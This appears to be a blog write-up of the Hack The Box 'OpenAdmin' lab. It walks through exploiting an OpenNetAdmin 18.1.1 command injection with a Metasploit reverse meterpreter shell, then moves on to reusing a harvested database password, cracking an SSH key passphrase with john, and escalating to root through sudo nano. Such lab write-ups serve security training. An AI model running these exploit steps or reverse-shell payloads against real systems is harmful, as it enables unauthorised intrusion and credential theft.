---
layout: post
title:  "Hack The Box - OpenAdmin"
date:   2020-05-03 10:27:00 +0800
categories: hackthebox opennetadmin gtfobin linux
---

![](/assets/images/openadmin.png){:height="414px" width="615px"}

# Configuration

The operating systems that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.171 openadmin.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC openadmin.htb
tarting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 11:35 EST
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.46s latency).                           
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 262.61 seconds

{% endhighlight %}

# Enumeration (1)

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, maybe we can find some information on it ?

![](/assets/images/openadmin1.png)

Nothing much here so lets bruteforce some directories using `gobuster`.

{% highlight bash %}
$ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -k -q 
...
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
{% endhighlight %}

There's a few places to check out but lets take a look at `/music` first.

![](/assets/images/openadmin2.png)

Mostly static pages but after much "crawling" around, I found `/ona` by clicking on the "Login" button only on the index page?

![](/assets/images/openadmin3.png)

We are presented with the UI for [`OpenNetAdmin`](https://opennetadmin.com/). 

{% highlight raw %}
OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors.
{% endhighlight %}

From the UI, we can see that the version of `OpenNetAdmin` installed on the box is `v18.1.1`. With that knowledge, I used `searchsploit` to search for any possible exploit for this version.

{% highlight bash %}
searchsploit OpenNetAdmin 18.1.1
----------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                     |  Path
                                                                                   | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                       | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                        | exploits/php/webapps/47691.sh
----------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
{% endhighlight %}

I will be using the `Metasploit` module for this one.

{% highlight bash %}
$ msfconsole
msf5 > search opennetadmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection

msf5 > use  exploit/unix/webapp/opennetadmin_ping_cmd_injection
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOSTS openadmin.htb
RHOSTS => openadmin.htb
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST tun0
LHOST => 10.10.XX.XX
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run 

[*] Started reverse TCP handler on 10.10.XX.XX:4444 
[*] Exploiting...
[*] Command Stager progress - 100.00% done (703/703 bytes)
[*] Exploit completed, but no session was created.
{% endhighlight %}

Hmm no session? Lets use a 64-bit payload instead.
{% highlight bash %}
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run 

[*] Started reverse TCP handler on 10.10.XX.XX:4444 
[*] Exploiting...
[*] Sending stage (3012516 bytes) to 10.10.10.171
[*] Meterpreter session 1 opened (10.10.XX.XX:4444 -> 10.10.10.171:48498) at 2020-04-30 22:45:18 -0400
[*] Command Stager progress - 100.00% done (808/808 bytes)

meterpreter > getuid
Server username: no-user @ openadmin (uid=33, gid=33, euid=33, egid=33)
{% endhighlight %}

Alright, we got a foothold! Lets try spawning a `tty` shell.

{% highlight bash %}
meterpreter > shell
which python
which python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$
{% endhighlight %}

Seems like we are in the web service's directory.

{% highlight bash %}
www-data@openadmin:/opt/ona/www$ ls -al
-rw-rw-r--  1 www-data www-data  1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 config
-rw-rw-r--  1 www-data www-data  1949 Jan  3  2018 config_dnld.php
-rw-rw-r--  1 www-data www-data  4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data  4096 Jan  3  2018 include
-rw-rw-r--  1 www-data www-data  1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data  4096 Jan  3  2018 local
-rw-rw-r--  1 www-data www-data  4526 Jan  3  2018 login.php
-rw-rw-r--  1 www-data www-data  1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 workspace_plugins
{% endhighlight %}

After some digging around, I only found database credentials in `/opt/ona/www/local/config/database_settings.inc.php`.

{% highlight bash %}
$ /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
{% endhighlight %}

Moving on, I went to check what users were on the box.

{% highlight bash %}
www-data@openadmin:/opt/ona/www$ ls -al /home 
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  6 jimmy  jimmy  4096 May  1 00:44 jimmy
drwxr-x---  6 joanna joanna 4096 May  1 02:43 joanna
{% endhighlight %}

With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into `jimmy`.

{% highlight bash %}
$ ssh jimmy@openadmin.htb
jimmy@openadmin.htb's password: n1nj4W4rri0R!
...
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
{% endhighlight %}

Unfortunately, `jimmy` doesn't have the `user.txt`, which means that `joanna` has it.

It was hard to figure where to go next so I did some basic enumeration and found a very interesting port `52846` that was only exposed on the localhost interface.

{% highlight bash %}
jimmy@openadmin:~$ netstat -peanut 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      111        20279      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      0          20231      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        16729      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          20036      -               
...
{% endhighlight %}

Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine.

{% highlight bash %}
$ ssh -L 1337:localhost:52846 jimmy@openadmin.htb
jimmy@openadmin.htb's password: n1nj4W4rri0R!

$ nmap -sV -sT -sC -p 1337 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 03:31 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000075s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Tutorialspoint.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds

{% endhighlight %}

There's a website on that port! Lets try visiting it using our browser.

![](/assets/images/openadmin4.png) 

I tried with the credentials I have so far and none of them worked, so I went to check the `apache2` configs to see where are the webpages being stored at.

{% highlight bash %}
jimmy@openadmin:/etc/apache2/sites-available$ ls -al 
total 24
drwxr-xr-x 2 root root 4096 Nov 23 17:13 .
drwxr-xr-x 8 root root 4096 Nov 21 14:08 ..
-rw-r--r-- 1 root root 6338 Jul 16  2019 default-ssl.conf
-rw-r--r-- 1 root root  303 Nov 23 17:13 internal.conf
-rw-r--r-- 1 root root 1329 Nov 22 14:24 openadmin.conf
{% endhighlight %}

Checking each of the config, we find out that the web pages are at `/var/www/internal` and we also see some hints of `joanna`.

{% highlight bash %}
jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
{% endhighlight %}

In the directory were 3 files.

{% highlight bash %}
jimmy@openadmin:/var/www/internal$ ls -al 
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
{% endhighlight %}

In `index.php`, we find the code used for the login page and the username and password hash were hard-coded in it!

{% highlight bash %}
jimmy@openadmin:/var/www/internal$ cat index.php
<?php
  $msg = '';

  if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
        $_SESSION['username'] = 'jimmy';
        header("Location: /main.php");
    } else {
        $msg = 'Wrong username or password.';
    }
  }
?>
{% endhighlight %}

If we lookup the hash online, we get "Revealed".

![](/assets/images/openadmin5.png) 

Now, if we enter "jimmy" as the username and "Revealed" as the password,

![](/assets/images/openadmin6.png) 

We got in! And we got a SSH private key?

Checking the code for `main.php`(which was the the page we were redirected to),

{% highlight bash %}
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
{% endhighlight %}

The private key belongs to user `joanna`. Lets try `ssh`ing using it.

{% highlight bash %}
$ chmod 700 id_rsa 
$ ssh -i id_rsa joanna@openadmin.htb
Enter passphrase for key 'id_rsa': 

{% endhighlight %}

The private key is protected with a passphrase, so we use `ssh2john` along with `john` to crack the passphrase

{% highlight bash %}
$ python /usr/share/john/ssh2john.py id_rsa > joanna.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
1g 0:00:00:05 DONE (2020-05-01 05:12) 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s     1990..*7¡Vamos!
Session completed
{% endhighlight %}

# user.txt

Now, we can finally get our `user.txt`.

{% highlight bash %}
$ ssh -i id_rsa joanna@openadmin.htb
Enter passphrase for key 'id_rsa': bloodninjas
...
joanna@openadmin:~$ cat user.txt
c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# Enumeration (2)

If we list the commands we can run `sudo` with,

{% highlight bash %}
joanna@openadmin:~$ sudo -l 
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
{% endhighlight %}


# root.txt

`joanna` can run `nano` as `root`! And according to [`GTFOBins`](https://gtfobins.github.io/gtfobins/nano/), we can spawn a shell as `root`.

Creating `/opt/priv` and running `nano` using `sudo` on `/opt/priv`:

{% highlight bash %}
joanna@openadmin:~$ touch /opt/priv
joanna@openadmin:~$ sudo /bin/nano /opt/priv
{% endhighlight %}

Doing `Ctrl+R` and `Ctrl+X`:

![](/assets/images/openadmin7.png) 

Executing the magical string and getting the flag:

![](/assets/images/openadmin8.png) 

Rooted ! Thank you for reading and look forward for more writeups and articles !